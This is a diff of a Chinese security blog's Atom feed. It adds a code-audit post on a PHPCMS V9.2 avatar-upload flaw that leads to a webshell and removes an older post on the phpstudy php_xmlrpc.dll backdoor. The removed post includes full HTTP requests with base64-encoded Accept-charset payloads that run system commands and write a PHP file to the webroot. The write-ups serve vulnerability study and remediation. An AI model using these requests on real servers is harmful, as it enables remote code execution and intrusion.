@@ -6,7 +6,7 @@
   <link href="https://bobtaoy.github.io/atom.xml" rel="self"/>
   
   <link href="https://bobtaoy.github.io/"/>
-  <updated>2021-02-02T13:01:04.243Z</updated>
+  <updated>2021-02-06T11:15:44.658Z</updated>
   <id>https://bobtaoy.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>代码审计之PHPCMSV9.2上传漏洞分析</title>
+    <link href="https://bobtaoy.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>https://bobtaoy.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
+    <published>2021-02-06T11:10:11.000Z</published>
+    <updated>2021-02-06T11:15:44.658Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="代码审计之PHPCMSV9-2上传漏洞分析"><a href="#代码审计之PHPCMSV9-2上传漏洞分析" class="headerlink" title="代码审计之PHPCMSV9.2上传漏洞分析"></a>代码审计之PHPCMSV9.2上传漏洞分析</h1><h2 id="安装环境-amp-需要用到工具"><a href="#安装环境-amp-需要用到工具" class="headerlink" title="安装环境&amp;需要用到工具"></a>安装环境&amp;需要用到工具</h2><ul><li>phpstudy2018</li><li>burp</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>前台随意注册一个用户，这里我以Tao这个普通用户演示。然后到修改头像处</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206103040314.png" alt="image-20210206103040314"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206105418973.png" alt="image-20210206105418973"></p><p>在此之前，还需要准备一个后缀为<code>zip</code>的压缩包文件具体内容如下：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206111259856.png" alt="image-20210206111259856"></p><blockquote><p>注意：php文件应放在一个目录中</p></blockquote><p>使用burp抓包-&gt;上传头像-&gt;保存图片</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206110358965.png" alt="image-20210206110358965"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206110545260.png" alt="image-20210206110545260"></p><p>讲<code>Tao.zip</code>中数据，按照上图的操作添加至请求中，最终效果如下图。然后放行</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206111005140.png" alt="image-20210206111005140"></p><p>接着访问<code>http://www.phpcms92.com/phpsso_server/uploadfile/avatar/1/1/1/taocs/a.php</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206111123522.png" alt="image-20210206111123522"></p><p>漏洞利用成功！</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206123040381.png" alt="image-20210206123040381"></p><p>图片处理请求url地址为<code>/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar&amp;auth_data=v=1&amp;appid=1&amp;data=b496CFMFAgRUVQAJAQIPUFwCAFQDAlMKXQ1fAVpDDFNbCEBIEGpTQRANb1JUHwo2WCooNV5eQ1FLCUFfcQQdeTNbVmhWAGNMEDJlWmJQAA</code>对应代码文件则是下图路劲显示的<code>uploadavatar</code>函数</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206131556063.png" alt="image-20210206131556063"></p><p>调试执行，再通过burp修改上传数据（存在恶意代码的压缩包）</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206125942361.png" alt="image-20210206125942361"></p><p>上图我们可以发现<code>$this-&gt;data[&#39;avatardata&#39;]</code>里面的存储值就是我们的zip数据</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206130021266.png" alt="image-20210206130021266"></p><p>继续执行，文件上传的路劲为<code>$dir = D:\www\www.phpcms92.com\phpsso_server/uploadfile/avatar/1/1/1/ </code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206130212531.png" alt="image-20210206130212531"></p><p>过了<code>file_put_contents</code>函数，在<code>$dir</code>目录生成了<code>1.zip</code>文件，接下来就是解压缩包的操作，F8过</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206130301276.png" alt="image-20210206130301276"></p><p>走到这里，就是触发漏洞的代码块了，我们继续执行</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206130501066.png" alt="image-20210206130501066"></p><p>遍历<code>$dir</code>目录，循环删除文件，注意下图<code>红色区域代码块</code>和当时<code>$file</code>的值</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206130714081.png" alt="image-20210206130714081"></p><p>继续执行，结束了。。。</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206130837233-1612589143089.png" alt="image-20210206130837233"></p><p>漏洞产生的原因就是<code>unlink</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array($file, $avatararr)) &#123;</span><br><span class="line">@unlink($dir.$file);<span class="comment">// 漏洞产生的原因</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210206131252281.png" alt="image-20210206131252281"></p><blockquote><p><code>unlink</code>函数只能删除文件，无法删除文件夹，这就是为什么上面利用的压缩包里的恶意代码文件需要放在目录下</p></blockquote><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>不使用zip压缩包处理图片文件</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;代码审计之PHPCMSV9-2上传漏洞分析&quot;&gt;&lt;a href=&quot;#代码审计之PHPCMSV9-2上传漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;代码审计之PHPCMSV9.2上传漏洞分析&quot;&gt;&lt;/a&gt;代码审计之PHPCMSV9.2上传漏洞分析&lt;/</summary>
+      
+    
+    
+    
+    <category term="PHP" scheme="https://bobtaoy.github.io/categories/PHP/"/>
+    
+    <category term="web安全" scheme="https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="代码审计" scheme="https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+    <category term="PHP代码审计" scheme="https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
   
   <entry>
     <title>颇有感触的2020</title>
@@ -479,34 +507,6 @@
     
     
     <category term="CTF" scheme="https://bobtaoy.github.io/tags/CTF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>phpstudy后门分析</title>
-    <link href="https://bobtaoy.github.io/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
-    <id>https://bobtaoy.github.io/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</id>
-    <published>2020-09-26T05:52:36.000Z</published>
-    <updated>2020-10-03T08:03:18.767Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><blockquote><p>有问题的版本：</p><p>​    默认路劲    C:\phpStudy\PHPTutorial\php\php-5.2.17\ext\</p></blockquote><table><thead><tr><th>PHPStudy</th><th>php版本</th><th>ext扩展文件夹下</th></tr></thead><tbody><tr><td>phpStudy20180211</td><td>php5.4.45 和 php5.2.17</td><td>php_xmlrpc.dll</td></tr><tr><td>phpStudy20161103</td><td>php5.4.45 和 php5.2.17</td><td>php_xmlrpc.dll</td></tr></tbody></table><p>后门所在位置：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104165448398.png" alt="image-20191104165448398"></p><p>使用记事本打开 <code>php_xmlrpc.dll</code>文件</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>我们通过burp抓包软件来利用后门</p><p>没有修改的请求头信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104170224539.png" alt="image-20191104170224539"></p><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip,deflate #deflate前面的空格去掉</span><br><span class="line">Accept-charset:c3lzdGVtKCdpcGNvbmZpZycpOw&#x3D;&#x3D; # 添加新字段，值需要base64编码</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行系统命令：<code>c3lzdGVtKCdpcGNvbmZpZycpOw==</code></p><p>解码为：<code>system(&#39;ipconfig&#39;);</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104170721857.png" alt="image-20191104170721857"></p><p>phpinfo</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104170830577.png" alt="image-20191104170830577"></p><p>写一句话木马,利用 file_put_contents()函数</p><p><code>file_put_contents(&quot;C:\phpStudy\PHPTutorial\WWW\info.php&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104171240547.png" alt="image-20191104171240547"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.131</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-charset:ZmlsZV9wdXRfY29udGVudHMoIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1xpbmZvLnBocCIsIjw&#x2F;cGhwIHBocGluZm8oKTsgPz4iKTs&#x3D;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104171403855.png" alt="image-20191104171403855"></p><h2 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h2><p>1.修改<code>php.ini</code>配置文件，注释这个扩展文件</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191104171619733.png" alt="image-20191104171619733"></p><ol start="2"><li>使用最新的phpstudy</li></ol>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;问题概述&quot;&gt;&lt;a href=&quot;#问题概述&quot; class=&quot;headerlink&quot; title=&quot;问题概述&quot;&gt;&lt;/a&gt;问题概述&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;有问题的版本：&lt;/p&gt;
-&lt;p&gt;​    默认路劲    C:\phpStudy\PHPTutori</summary>
-      
-    
-    
-    
-    <category term="PHP" scheme="https://bobtaoy.github.io/categories/PHP/"/>
-    
-    
-    <category term="php安全" scheme="https://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"/>
-    
-    <category term="phpstudy后门分析" scheme="https://bobtaoy.github.io/tags/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
